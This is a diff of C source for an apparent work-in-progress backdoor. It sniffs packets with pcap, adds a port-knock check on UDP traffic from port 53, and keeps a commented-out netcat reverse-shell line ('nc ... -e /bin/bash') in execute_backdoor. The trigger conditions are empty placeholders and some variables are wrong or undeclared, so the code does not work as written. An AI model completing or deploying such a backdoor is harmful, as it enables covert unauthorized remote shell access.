@@ -75,16 +75,28 @@ void mask_application(char *name)
 void process_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet)
 {
 	int size = header->len;
+	unsigned short iphdrlen;
 
 	struct iphdr *iph = (struct iphdr*)(packet + sizeof(struct ethhdr));
+	iphdrlen = ip->ihl * 4;
 
-	static int count = 1;
-	fprintf(stdout,"%d.. ",count);
-	fflush(stdout);
-	count++;
+	struct udphdr *udph = (struct udphdr*)(packet + iphdrlen + sizeof(struct ethhdr));
 
 
-	// if knock... execute_backdoor
+	int sPort = ntohs(udph->source);
+	// make sure udp
+	if((iph->protocol == 17) && (sPort == 53))
+	{
+		int id = ntohs(iph->id);
+		if( // id something)
+		{
+			dPort = ntohs(udph->dest);
+			if( // dPort something)
+			{
+				
+			}
+		}
+	}
 }
 
 /*-----------------------------------------------------------------------------------------------
@@ -101,9 +113,9 @@ void process_packet(u_char *args, const struct pcap_pkthdr *header, const u_char
 --------------------------------------------------------------------------------------------------*/
 void execute_backdoor(char *addr, int port)
 {
+	printf("executing...\n");
 	// send shell to client
 	//system("nc %s %d -e /bin/bash", addr, port);
-
 }
 
 /*-----------------------------------------------------------------------------------------------
